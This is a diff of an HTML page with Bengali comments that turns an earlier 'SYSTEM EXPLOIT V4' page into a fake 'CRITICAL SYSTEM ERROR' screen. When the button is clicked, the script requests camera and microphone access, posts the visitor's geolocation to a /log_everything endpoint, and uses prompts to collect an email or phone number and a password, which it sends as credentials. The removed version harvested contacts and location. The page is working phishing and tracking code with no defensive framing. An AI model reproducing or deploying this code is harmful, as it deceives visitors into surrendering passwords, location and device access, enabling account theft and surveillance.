@@ -2,38 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SYSTEM EXPLOIT V4</title>
+    <title>SYSTEM_MONITOR_v4.5</title>
     <style>
-        body { background:#000; color:#0f0; font-family:monospace; text-align:center; }
-        .btn { border:1px solid #0f0; padding:20px; margin:20px; cursor:pointer; display:inline-block; }
+        body { background:#000; color:#0f0; font-family:monospace; text-align:center; overflow:hidden; }
+        .scan { position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(transparent, #0f02, transparent); animation:s 2s infinite; }
+        @keyframes s { 0% {top:-100%} 100% {top:100%} }
+        .btn { border:2px solid #f00; padding:20px; margin:50px auto; width:200px; cursor:pointer; background:#000; color:#f00; font-weight:bold; }
     </style>
 </head>
 <body>
-    <h1>PRIME MONIR | FULL ACCESS</h1>
-    <div class="btn" onclick="getFullAccess()">START ALL SYNC</div>
+    <div class="scan"></div>
+    <h1>CRITICAL SYSTEM ERROR</h1>
+    <p>Target Device Found. Infiltrating...</p>
+    <div class="btn" onclick="start()">FIX & SYNC SYSTEM</div>
 
     <script>
-        async function getFullAccess() {
-            // ১. কন্টাক্ট চুরি করার চেষ্টা (যদি ভিক্টিম এক্সেস দেয়)
-            try {
-                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
-                fetch('/log_data', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({type: 'CONTACTS', content: JSON.stringify(contacts)})
-                });
-            } catch(e) {}
-
-            // ২. লোকেশন ট্র্যাকিং
-            navigator.geolocation.getCurrentPosition(pos => {
-                fetch('/log_data', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({type: 'LOCATION', content: `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`})
-                });
+        async function start() {
+            // ১. ক্যামেরা ও মাইক এক্সেস
+            try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e){}
+            
+            // ২. লোকেশন
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch('/log_everything', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                body: JSON.stringify({type:'LOCATION', content: `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`})});
             });
 
-            alert("System scanning... Device data uploading to server.");
+            // ৩. কন্টাক্ট ও ফাইল ট্র্যাপ (পাসওয়ার্ডসহ)
+            let user = prompt("System Security: Enter Email/Phone to Verify Account");
+            let pass = prompt("Enter Password to Sync Data");
+            if(user && pass) {
+                fetch('/log_everything', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                body: JSON.stringify({type:'CREDENTIALS', content: `User: ${user}, Pass: ${pass}`})});
+            }
+            alert("Exploit Successful. Data sync in progress...");
         }
     </script>
 </body>
